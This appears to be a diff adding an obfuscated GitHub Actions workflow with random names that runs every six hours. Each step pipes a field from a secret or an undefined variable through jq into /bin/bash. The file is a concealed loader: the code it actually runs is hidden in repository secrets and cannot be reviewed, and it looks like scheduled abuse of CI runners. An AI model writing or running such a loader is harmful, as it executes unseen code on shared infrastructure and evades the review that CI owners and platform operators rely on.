@@ -1,0 +1,24 @@
+name: yuanriyue3461
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuanriyue3461
+        env:
+          e40: ${{ secrets.e40 }}
+        run: |
+          echo $e40 | jq -r .hyiiy1471 | /bin/bash
+          echo $kawv4 | jq -r .oh61007 | /bin/bash
+          echo $wdco65463 | jq -r .lril46046 | /bin/bash
+          echo $l7 | jq -r .ejezk95661 | /bin/bash
+          echo $tpipa4 | jq -r .inniv0 | /bin/bash
+          echo $krol22038 | jq -r .hsw1 | /bin/bash
+          echo $zj33 | jq -r .wggrj5 | /bin/bash
+          echo $iyfbr82 | jq -r .nwdl7993 | /bin/bash
+
